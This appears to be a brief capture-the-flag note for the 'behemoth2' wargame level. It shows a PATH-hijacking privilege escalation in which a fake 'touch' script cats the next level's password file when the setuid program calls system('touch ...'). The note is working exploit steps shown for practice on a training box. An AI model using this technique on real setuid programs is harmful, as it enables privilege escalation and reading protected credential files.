Create an fake ‘touch’

echo "cat /etc/behemoth_pass/behemoth3" > touch

PATH=/tmp/tmp112:$PATH /behemoth/behemoth2
chmod 777 touch
so when system("touch 23751") is run
then cat is called.

also if echo "echo" > touch
this doesnt echo the current pid in the program, same as ./touch hello
would return no hello
